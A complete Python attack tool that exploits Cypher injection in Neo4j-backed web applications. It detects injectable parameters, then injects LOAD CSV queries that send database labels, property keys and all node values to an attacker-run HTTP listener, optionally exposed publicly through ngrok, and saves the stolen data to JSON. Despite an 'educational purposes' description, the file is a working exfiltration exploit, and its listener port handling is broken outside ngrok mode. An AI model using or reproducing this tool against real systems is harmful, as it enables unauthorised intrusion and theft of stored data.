#!/usr/bin/python3
import argparse
import requests
import urllib.parse
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys
import json
import os
from tabulate import tabulate
from pyngrok import ngrok
import time

data_queue = queue.Queue()

# Helper functions
def get_ip_address(network_interface):
    """Retrieve the IP address for a given network interface."""
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    """Extract query parameters from a query string."""
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    return {key: value for key, value in matches}

def merge_dicts(list_of_dicts):
    """Merge a list of dictionaries into a single dictionary."""
    merged_dict = {}
    for single_dict in list_of_dicts:
        merged_dict.update(single_dict)
    return merged_dict

def convert_to_json(data):
    """Convert data structure into a JSON string."""
    result_dict = {str(index+1): merge_dicts(item) for index, item in enumerate(data)}
    return json.dumps(result_dict, indent=2)

def write_json_to_file(json_data, filename="output.json"):
    """Write JSON data to a file."""
    output_dir = os.path.join(os.getcwd(), "output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    file_path = os.path.join(output_dir, filename)
    with open(file_path, 'w') as file:
        file.write(json_data)
    
    print(f"JSON data has been written to {file_path}")

def json_to_table(json_data):
    """
    Convert JSON data into a nicely formatted table and print it.

    Args:
    - json_data: A JSON string representing the structured data.
    """
    # Convert the JSON string back into a Python dictionary
    data_dict = json.loads(json_data)

    # Prepare data for the tabulate library
    # Assuming the JSON structure is a dictionary of dictionaries
    headers = []
    table_data = []
    for key, value in data_dict.items():
        if not headers:
            headers = ["ID"] + list(value.keys())
        row = [key] + list(value.values())
        table_data.append(row)

    # Generate and print the table
    print(tabulate(table_data, headers=headers, tablefmt="grid"))

# Classes
class RequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP GET requests."""
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    """A simple HTTP server listening for data."""
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        print("Starting listener...")
        self.server.serve_forever()

    def stop_listener(self):
        print("Stopping listener...")
        self.server.shutdown()

class Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database."""
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {'http': 'http://127.0.0.1:8080'}

    def inject_payload(self, payload):
        """Inject a crafted payload to the target."""
        for injection_character in ["-1", "'", "\""]:
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            self.execute_request(url, data)

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print("302 Redirect, Cookies Expired/Invalid ?")
                sys.exit()
            elif response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                print(f"Payload Injected Successfully: {response.status_code}")
                return response
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")

        return None

    def detect_inject(self):
        print("Determining if the target is injectable")
        injection_characters = ["'", "\"", "-1"]
        working_char = ""
        or_case = None
        and_case = None
        for injection_character in injection_characters:
            if (injection_character == "-1"):
                payload = f" OR 1=1"
            else:
                payload = f" OR 1=1 OR 'g' = {injection_character}g"
            full_payload = f"{injection_character}{payload}"
            encoded_payload = urllib.parse.quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            if (response):
                working_char = injection_character
                or_case = response
                break

        if (working_char == "-1"):
            full_payload = f"{working_char} AND 1=1 AND 1=0"
        else:
            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
        encoded_payload = urllib.parse.quote(full_payload, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        and_case = self.execute_request(url, data)
        
        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])

    def exfil_data(self):

        print("Dumping labels count")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 // ")

        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        label_count = parsed_data.get('label_count', None)  # Extract the label value
        
        print("Dumping Labels")
        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")

        # Store labels
        labels = []
        for i in range(int(label_count)):
            data = data_queue.get()  # Retrieve the next item from the queue
            parsed_data = extract_query_params(data)  # Use the previously defined function
            label_value = parsed_data.get('label', None)  # Extract the label value
            labels.append(label_value)


        label = input(f"Select label to dump {labels}: ")

        # print("Dumping Properties")
        # self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p LOAD CSV FROM '{self.exfil_ip}/?keys=' + p as l RETURN 0 as _0 //")

        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?value_count=' + y as l RETURN 0 as _0 //")


        data = data_queue.get()  # Retrieve the next item from the queue
        parsed_data = extract_query_params(data)  # Use the previously defined function
        value_count = parsed_data.get('value_count', None)  # Extract the label value

        print("Dumping Values Property=Value")
        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT x,p LOAD CSV FROM '{self.exfil_ip}/?' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //")


        values = [] 
        while not data_queue.empty():
            pair = []
            for _ in range(int(value_count)):  # Get 2 items
                if not data_queue.empty():
                    data = data_queue.get()
                    parsed_data = extract_query_params(data)
                    pair.append(parsed_data)
                else:
                    print("Queue does not contain enough items for the last pair.")
                    break
            values.append(pair)

        json_result = convert_to_json(values)
        write_json_to_file(json_result)
        json_to_table(json_result)

        
def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--parameters", default="", help="Vulnerable parameters")
    parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
    parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
    parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
    parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
    args = parser.parse_args()

    if args.int == "public":
        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
        if ngrok_auth_token:
            ngrok.set_auth_token(ngrok_auth_token)
        else:
            print("Ngrok auth token not set. Please set the NGROK_AUTH_TOKEN environment variable.")
            sys.exit(1)
        start_ngrok = ngrok.connect(args.listen_port, "tcp")
        url = start_ngrok.public_url.replace("tcp://", "http://")
        hostname, port = url.split("://")[1].split(":")
        args.exfil_ip = f"http://{hostname}"
        old_port = args.listen_port
        args.listen_port = int(port)
        
        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")

    elif args.int:
        args.exfil_ip = f"http://{get_ip_address(args.int)}"
    else:
        args.exfil_ip = "127.0.0.1"


    listener = Listener(old_port)
    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
    listener_thread.start() 

    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)

    if (args.type == "API"):
        if (injector.detect_inject()):
            print("Target likely injectable, continuing")
        else:
            if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
                return
    else:
        print("This version of the program only supports injection detection of API methods")

    # Begin exfiltration process
    injector.exfil_data()

    listener.stop_listener()
    listener_thread.join()

    if args.int == "public":
        ngrok.disconnect(start_ngrok.public_url)

if __name__ == "__main__":
    main()
